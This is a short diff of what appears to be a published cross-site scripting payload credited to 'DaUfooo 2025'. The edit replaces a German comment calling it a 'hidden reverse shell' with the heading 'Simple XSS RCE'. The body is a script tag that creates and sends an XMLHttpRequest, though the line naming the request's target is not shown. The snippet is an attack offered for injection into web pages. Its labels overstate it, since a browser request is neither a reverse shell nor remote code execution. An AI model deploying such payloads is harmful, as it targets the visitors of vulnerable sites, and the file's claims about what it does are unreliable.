@@ -1,5 +1,4 @@
-// Versteckte Reverse-Shell
-// Wenn du ein XSS ausnutzt, um JavaScript im Browser des Benutzers auszuführen, könntest du eine Reverse-Shell erzeugen um eine Shell zu öffnen. 
+<!-- Simple XSS RCE --> 
 
 😊 <script>
     var xhr = new XMLHttpRequest();
@@ -7,4 +6,4 @@
     xhr.send();
 </script>
 
-// By DaUfooo 2025
+<!-- By DaUfooo 2025 -->
